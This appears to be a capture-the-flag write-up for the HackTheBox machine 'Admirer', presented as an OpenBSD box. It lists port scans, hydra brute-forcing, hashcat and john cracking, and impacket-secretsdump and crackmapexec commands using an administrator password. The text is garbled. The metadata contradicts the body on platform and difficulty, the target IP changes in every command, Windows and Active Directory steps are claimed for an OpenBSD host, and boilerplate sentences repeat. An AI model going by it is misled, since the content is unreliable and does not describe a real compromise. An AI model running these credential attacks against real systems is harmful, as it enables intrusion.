---
TitleSEO: "HackTheBox — Admirer (Hard OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Admirer (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Admirer. LAPS Abuse and CSRF to achieve hard compromise on OpenBSD."
Keywords: "easy, tryhackme, reversing, linux"
URL: "https://zurefx.github.io/writeups/htb-admirer-741.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-admirer-741/"
Date: "2024-06-11"
Tags: "Easy, TryHackMe, Reversing, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-admirer-741"
Permalink: "/writeups/htb-admirer-741.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Admirer** is rated **Hard** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.78.229.156`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.81.212 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.124.171.80
```

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```bash
gobuster dir -u http://10.11.168.85/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.196.106
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.49.115/FUZZ
nmap -sCV -p636,110,443 10.30.167.160 -oN scan.txt
```

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

Key finding: **LXD Privilege Escalation**.

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p636,3306,27017 10.40.224.83 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.3.250 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p8443,993,21 10.111.165.102 -oN scan.txt
gobuster dir -u http://10.98.36.124/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```powershell
nmap -sCV -p8888,1521,25 10.103.58.169 -oN scan.txt
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.44.82.199 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `hashcat`
- `enum4linux`
- `socat`
- `wmiexec`
- `psexec`
- `ldapsearch`
- `burpsuite`
- `hydra`

### Key Takeaways

- LAPS Abuse
- CSRF
- IDOR
- LXD Privilege Escalation
